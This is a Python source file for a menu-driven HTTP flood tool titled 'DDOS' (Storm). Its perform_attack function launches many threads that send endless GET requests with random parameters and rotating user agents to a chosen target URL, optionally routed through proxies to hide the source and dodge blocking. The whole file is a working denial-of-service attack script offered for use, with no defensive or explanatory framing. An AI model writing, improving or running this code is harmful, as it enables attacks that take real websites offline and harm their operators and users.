import threading
import requests
import random
import string
import time
import sys
import os

# Import user agents and proxies from external files
from user_agents import user_agents
from proxies import proxies_list

# Colors
class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    SCARY = '\033[5;31;40m'  

def print_title():
    title = """
{}█
▓█████▄ ▓█████▄  ▒█████    ██████ 
▒██▀ ██▌▒██▀ ██▌▒██▒  ██▒▒██    ▒ 
░██   █▌░██   █▌▒██░  ██▒░ ▓██▄   
░▓█▄   ▌░▓█▄   ▌▒██   ██░  ▒   ██▒
░▒████▓ ░▒████▓ ░ ████▓▒░▒██████▒▒
 ▒▒▓  ▒  ▒▒▓  ▒ ░ ▒░▒░▒░ ▒ ▒▓▒ ▒ ░
 ░ ▒  ▒  ░ ▒  ▒   ░ ▒ ▒░ ░ ░▒  ░ ░
 ░ ░  ░  ░ ░  ░ ░ ░ ░ ▒  ░  ░  ░  
   ░       ░        ░ ░        ░  
 ░       ░                        (Storm )
{}""".format(bcolors.SCARY, bcolors.ENDC)
    print(title)

def random_string(length=8):
    letters = string.ascii_letters
    return ''.join(random.choice(letters) for i in range(length))

def random_headers():
    headers = {
        'User-Agent': random.choice(user_agents),
        'Accept-Language': 'en-US,en;q=0.9',
        'Accept-Encoding': 'gzip, deflate, br',
        'Connection': 'keep-alive'
    }
    return headers

def perform_attack(target_url, num_threads, use_proxies):
    def attack():
        try:
            while True:
                params = {random_string(): random_string() for _ in range(5)} 
                headers = random_headers()
                
                if use_proxies:
                    proxy = {'http': random.choice(proxies_list)}
                    response = requests.get(target_url, params=params, proxies=proxy, headers=headers)
                    print(f"{bcolors.OKGREEN}Request sent: {response.status_code}, Params: {params}, Proxy: {proxy['http']}, Headers: {headers['User-Agent']}{bcolors.ENDC}")
                else:
                    response = requests.get(target_url, params=params, headers=headers)
                    print(f"{bcolors.OKGREEN}Request sent: {response.status_code}, Params: {params}, Headers: {headers['User-Agent']}{bcolors.ENDC}")
                
                time.sleep(random.uniform(0.05, 0.2))  
        except Exception as e:
            print(f"{bcolors.FAIL}Error: {e}{bcolors.ENDC}")

    threads = []
    for i in range(num_threads):
        thread = threading.Thread(target=attack)
        thread.start()
        threads.append(thread)

    for thread in threads:
        thread.join()

def save_to_file(filename, variable_name, data_list):
    with open(filename, 'w') as file:
        file.write(f'{variable_name} = [\n')
        for item in data_list:
            file.write(f'    {repr(item)},\n')
        file.write(']\n')

def main_menu():
    print_title()
    while True:
        print(f"{bcolors.WARNING}1. Start Attack{bcolors.ENDC}")
        print(f"{bcolors.OKCYAN}2. Add User Agent{bcolors.ENDC}")
        print(f"{bcolors.OKBLUE}3. Add Proxy{bcolors.ENDC}")
        print(f"{bcolors.HEADER}4. Check Number of Proxies{bcolors.ENDC}")
        print(f"{bcolors.SCARY}5. Reset and Delete All Proxies{bcolors.ENDC}")
        print(f"{bcolors.OKGREEN}6. Check Number of User Agents{bcolors.ENDC}")
        print(f"{bcolors.SCARY}7. Reset and Delete All User Agents{bcolors.ENDC}")
        print(f"{bcolors.FAIL}8. Exit{bcolors.ENDC}")
        choice = input(f"{bcolors.OKGREEN}Enter Your Choice :{bcolors.ENDC}")
       
        if choice == '1':
            target_url = input(f"{bcolors.OKBLUE}Enter the target URL: {bcolors.ENDC}")
            num_threads = int(input(f"{bcolors.OKBLUE}Enter the number of threads: {bcolors.ENDC}"))
            use_proxies = input(f"{bcolors.OKBLUE}Use proxies? (yes/no): {bcolors.ENDC}").strip().lower() == 'yes'
            perform_attack(target_url, num_threads, use_proxies)
        elif choice == '2':
            user_agent = input(f"{bcolors.OKCYAN}Enter a user agent: {bcolors.ENDC}")
            user_agents.append(user_agent)
            save_to_file('user_agents.py', 'user_agents', user_agents)
            print(f"{bcolors.OKCYAN}User agent added.{bcolors.ENDC}")
        elif choice == '3':
            proxy = input(f"{bcolors.OKGREEN}Enter a proxy (format: http://IP:PORT): {bcolors.ENDC}")
            proxies_list.append(proxy)
            save_to_file('proxies.py', 'proxies_list', proxies_list)
            print(f"{bcolors.OKGREEN}Proxy added.{bcolors.ENDC}")
        elif choice == '4':
            print(f"{bcolors.WARNING}Number of proxies: {len(proxies_list)}{bcolors.ENDC}")
        elif choice == '5':
            proxies_list.clear()
            save_to_file('proxies.py', 'proxies_list', proxies_list)
            print(f"{bcolors.FAIL}All proxies have been deleted.{bcolors.ENDC}")
        elif choice == '6':
            print(f"{bcolors.BOLD}Number of user agents: {len(user_agents)}{bcolors.ENDC}")
        elif choice == '7':
            user_agents.clear()
            save_to_file('user_agents.py', 'user_agents', user_agents)
            print(f"{bcolors.UNDERLINE}All user agents have been deleted.{bcolors.ENDC}")
        elif choice == '8':
            print(f"{bcolors.ENDC}Exiting...")
            sys.exit()
        else:
            print(f"{bcolors.FAIL}Invalid choice. Please try again.{bcolors.ENDC}")

if __name__ == "__main__":
    main_menu()